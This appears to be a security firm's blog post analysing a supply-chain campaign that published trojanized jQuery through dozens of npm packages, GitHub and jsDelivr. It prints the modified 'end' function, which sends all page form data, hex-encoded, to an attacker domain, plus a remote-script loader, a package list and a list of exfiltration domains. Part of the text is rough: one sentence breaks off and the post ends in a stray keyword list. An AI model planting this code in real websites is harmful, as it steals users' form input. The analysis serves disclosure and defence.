@@ -1,0 +1,207 @@
+
+Since May 26, 2024, Phylum has been monitoring a persistent supply chain attacker involving a trojanized version of jQuery. We initially discovered the malicious variant on npm, where we saw the compromised version published in dozens of packages over a month. After investigating, we found instances of the trojanized jQuery on other platforms, such as GitHub, and even as a CDN-hosted resource on jsDelivr.
+Background
+This attack stands out due to the high variability across packages. The published packages were relatively minimal, yet the attacker included at least one complete copy of jQuery, often named jquery.min.js, along with other variations such as registration.min.js, icon.min.js, and fontawesome.js. The exfiltration URLs were almost unique for each package, and the attacker published to npm under new usernames. Occasionally, a single user would publish multiple, usually related, packages. Sometimes, the attacker included multiple file versions with different names within the same project. Interestingly, almost every package also contained personal files not typically included in npm publications, such as the npm cache folder, npm logs folder, and a termux.properties file. Overall, this attack is unlike most we've seen at this scale, which typically have a clear, well-defined pattern and an obvious automated aspect. Here, the ad-hoc nature and custom variability of the packages, along with the long timeframe over which they were published, suggest that each package was manually assembled and published.
+The Attack
+Let’s take a closer look at how the attacker trojanized jQuery. As mentioned above, each package contained a copy of jQuery with one small difference—the end function, a part of the jQuery prototype, is modified to include additional malicious code. Here’s that part:
+end: async function () {
+  await $.ajax({
+    url: "<https://anti-spam>[.]truex[.]biz[.]id/halo/?cat=" + (function (e) {
+      for (var t, n = 0, r = e.length, i = ""; n < r; ++n)
+        i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
+      return i;
+    })($("form").serialize()),
+    type: "GET",
+    dataType: "text",
+    headers: { "Content-type": "application/json" },
+  });
+}
+According to the jQuery docs, the end method is supposed to
+For reference, in the legitimate jQuery source, this is the code for the end method:
+end: function () {
+        return this.prevObject || this.constructor();
+      }
+As advertised, it simply returns the previous object. However, in the malicious code, the attacker is firing off a non-blocking GET request via $.ajax to a remote URL. The URL includes a query parameter (the name of which varies across packages as well) that is constructed by serializing all form data on the page (($("form").serialize())). The serialized data is then encoded into a hex string.
+This means that if you’re using this trojanized version, all form data on the page is exfiltrated any time the end function is called. As far as we can tell, the end function doesn’t appear to be widely used directly. However, looking at the rest of the jQuery library, you’ll notice that the fadeTo method from jQuery’s animation toolkit uses the end method, which is very interesting as fadeTo is far more widely used than end. Here’s the relevant snippet of fadeTo:
+fadeTo: function (e, t, n, r) {
+  return this.filter(ae)
+    .css("opacity", 0)
+    .show()
+    .end()
+    .animate({ opacity: t }, e, n, r);
+}
+Proliferation of the Trojanized Version
+During our investigation, we also found a user called indexsc on GitHub hosting several versions of the trojanized jQuery file.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20240824_202033_906201\Screenshot20240701at4.02.05PM.png
+Taking a look at the ajax repo:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20240824_202033_906201\Screenshot20240701at4.02.17PM.png
+Both slim.js and all-min.js contain the trojanized version:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20240824_202033_906201\Screenshot20240703at10.30.27AM.png
+Interestingly, both icons.js and min.js contain a script that adds new script tags from remote sources:
+!function (e) { 
+    var t = ["[ionicons] Deprecated script, please remove: " + (s = e.scripts[e.scripts.length - 1]).outerHTML]; 
+    t.push("To improve performance it is recommended to set the differential scripts in the head as follows:"); 
+    var n = s.src.split("/"); 
+    n.pop(); 
+    n.push("ionicons"); 
+    var s; 
+    n.join("/"); 
+    (s = e.createElement("script")).setAttribute("type", "module"), s.src = "<https://unpkg.com/ionicons@5.0.0/dist/ionicons/ionicons.esm.js>", 
+    t.push(s.outerHTML), 
+    s.setAttribute("data-stencil-namespace", "ionicons"), 
+    e.head.appendChild(s), 
+    (s = e.createElement("script")).setAttribute("nomodule", ""), 
+    s.src = "<https://unpkg.com/ionicons@5.0.0/dist/ionicons/ionicons.js>", 
+    t.push(s.outerHTML), 
+    s.setAttribute("data-stencil-namespace", "ionicons"), 
+    e.head.appendChild(s), 
+    console.warn(t.join("\\n")) 
+}(document), 
+
+function () { 
+    var e = document.createElement("script"); 
+    e.type = "text/javascript"; 
+    e.src = "<https://cdn.jsdelivr.net/gh/indexsc/libs/slim.js>"; 
+    document.body.appendChild(e); 
+}();
+This script is also suspicious. First, it generates a phony warning indicating that the version of Ionicons is deprecated (without even checking what the current version is) and then replaces it with v5.0.0. This is odd because v5.0.0 of Ionicons was released in February 2020. The current version is 7.4.0 and released in May of 2024. After forcing v5.0.0 of ionicons upon the user, it then adds a new script element to the document’s body and sets its source to https://cdn[.]jsdelivr[.]net/gh/indexsc/libs/slim.js. This is also highly suspicious and, unsurprisingly, navigating there reveals that this, too, is the trojanized version:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20240824_202033_906201\Screenshot20240703at10.55.25AM.png
+It’s worth noting that jsdelivr constructs these GitHub URLs automatically without needing to upload anything to the CDN explicitly. This is likely an attempt by the attacker to make the source look more legitimate or to sneak through firewalls by using jsdelivr instead of loading the code directly from GitHub itself.
+Where Does That Leave Us?
+To recap, we are witnessing a complex and persistent supply chain attack involving the publication of dozens of packages under multiple npm accounts, each containing a trojanized version of jQuery. The malicious version extracts website form data and sends it to one of many URLs. The attacker has cleverly hidden the malware in the seldom-used end function of jQuery, which is internally called by the more popular fadeTo function from its animation utilities.
+For the malware to be triggered, a user must install one of the malicious packages, use the included trojanized jQuery file, and then invoke either the end function or the fadeTo function. This specific chain of conditions makes it unclear whether this is a highly targeted attack or if the attacker is simply blending in well and randomly affecting users who download and use these packages.
+The sheer number of packages, the variability in naming conventions, and the inclusion of personal files within these packages raise questions about the attacker’s capabilities and intentions. These factors contrast sharply with the more sophisticated nature of the actual malware itself and the effort taken to conceal its maliciousness in plain sight. Despite the narrow set of conditions required to trip the malware, the broad distribution of the packages means the potential impact is wide, potentially affecting many unsuspecting developers. This novel attack exemplifies the rising complexity and potential for the broad reach of supply chain threat actors.
+Packages Related to This Campaign
+
+Publication	Name	Version
+2024-06-23	icnes	8.0.0
+2024-06-23	stylesyosx	9.0.3
+2024-06-22	imagegs	1.0.0
+2024-06-22	yorz	3.0.0
+2024-06-21	kurxjy	9.0.0
+2024-06-20	kinthailxzz	1.0.0
+2024-06-19	ganz	2.0.1
+2024-06-19	kikos	1.0.0
+2024-06-17	rgmedia	3.7.2
+2024-06-17	rgmedia21	3.7.3
+2024-06-17	ngentot	3.7.1
+2024-06-17	mediaa	2.0.0
+2024-06-16	jquerrty	3.0.0
+2024-06-16	styyle	3.0.0
+2024-06-16	my-gh	8.0.1
+2024-06-16	sytlesheets	3.0.0
+2024-06-16	stylessheet	3.0.0
+2024-06-15	styleshteks	2.0.0
+2024-06-15	fontawessome	9.0.1
+2024-06-15	fontawesom-1	9.0.1
+2024-06-14	nesiahanzz	1.0.0
+2024-06-14	dsiailon	1.0.0
+2024-06-14	footersicons	3.0.0
+2024-06-14	footericonss	3.6.0
+2024-06-14	footericonds	3.7.1
+2024-06-14	fontawesome-3	2.0.0
+2024-06-14	fontawesom-4	2.0.0
+2024-06-13	jquertyi	3.6.4
+2024-06-13	fontawesome-2	9.0.1
+2024-06-13	stylishteksz	2.0.0
+2024-06-13	stylescss	9.0.1
+2024-06-12	dsiain	1.0.0
+2024-06-11	logoo	2.0.0
+2024-06-11	stylishhteks	2.0.1
+2024-06-10	imagezz	1.0.0
+2024-06-10	stylishtekss	3.0.0
+2024-06-10	stylesheeet	9.0.1
+2024-06-09	dnuhstng	2.0.0
+2024-06-09	stylishteks	2.0.0
+2024-06-09	mobiletrack	9.0.0
+2024-06-09	fontaway	9.0.0
+2024-06-08	sttylee	9.0.1
+2024-06-06	kontolq	9.0.1
+2024-06-06	kimakq	9.0.1
+2024-06-05	awokkdyaa	9.0.1
+2024-06-05	vxcs	9.0.1
+2024-06-05	kimakz	9.0.1
+2024-06-05	xhyp	9.0.1
+2024-06-05	xytta	1.0.0
+2024-06-05	livinjs	1.0.0
+2024-06-04	fontawesome-1	9.0.0
+2024-06-04	fontwesome	9.0.0
+2024-06-04	footricon	9.0.0
+2024-06-04	bootstrapcloud	1.3.3
+2024-06-04	flammerxdjson	9.0.1
+2024-06-04	ajexx	9.0.0
+2024-06-04	komcay	9.0.1
+2024-06-04	ajex	9.0.1
+2024-06-04	komcaxx	9.0.2
+2024-06-04	komcaxx	9.0.1
+2024-06-03	komcax	9.0.0
+2024-06-03	cloudhosting	7.13.0
+2024-06-02	cloudhost	7.13.0
+2024-06-02	bootrun	3.9.7
+2024-06-02	xxxtesting	1.2.0
+2024-06-02	bootstar	9.4.8
+2024-06-02	jqueryxxx	1.0.0
+2024-05-26	cdnjquery	9.0.1
+Domains Used in This Campaign
+https://paneljs[.]hanznesia[.]my[.]id
+https://api-web-vrip[.]hanznesia[.]my[.]id
+https://log[.]api-system[.]engineer
+https://irisainginbos[.]icikipoxx[.]pw
+https://patipride[.]icikipoxx[.]pw
+https://apii[.]fukaes[.]ninja
+https://pukil[.]dannew[.]biz[.]id
+https://api[.]jstyy[.]xyz
+https://qxue[.]biz[.]id
+https://api[.]newrxl[.]online
+https://api[.]iimg[.]my[.]id
+https://apiweb[.]eventtss[.]my[.]id
+https://pokemon[.]denii[.]biz[.]id
+https://apii[.]codatuys[.]cab
+https://api[.]codatuys[.]biz[.]id
+https://saystem[.]ditzzultimate[.]xyz
+https://paneljs[.]dimashost[.]xyz
+https://cssimage[.]dimashost[.]xyz
+https://ajax[.]failexpect[.]biz[.]id
+https://ns[.]api-system[.]engineer
+https://log[.]systems-alexhost[.]xyz
+https://api-system[.]engineer
+https://systems-alexhost[.]xyz
+https://panel[.]api-bo[.]my[.]id
+https://project[.]systemgoods[.]me
+https://danu[.]eventtss[.]my[.]id
+https://panel-host[.]clannesia[.]com
+http://apii-pandawara[.]ganznesia[.]my[.]id
+https://system-alexhosting[.]biz[.]id
+https://nd[.]api-system[.]engineer
+https://anti-spam[.]truex[.]biz[.]id
+https://panel-host[.]dmdpanel[.]my[.]id
+https://api-bo[.]my[.]id
+jquery.min.js
+registration.min.js
+icon.min.js
+fontawesome.js
+termux.properties
+end
+end
+end
+GET
+$.ajax
+($("form").serialize())
+end
+end
+fadeTo
+end
+fadeTo
+end
+fadeTo
+indexsc
+ajax
+slim.js
+all-min.js
+icons.js
+min.js
+https://cdn[.]jsdelivr[.]net/gh/indexsc/libs/slim.js
+end
+fadeTo
+end
+fadeTo
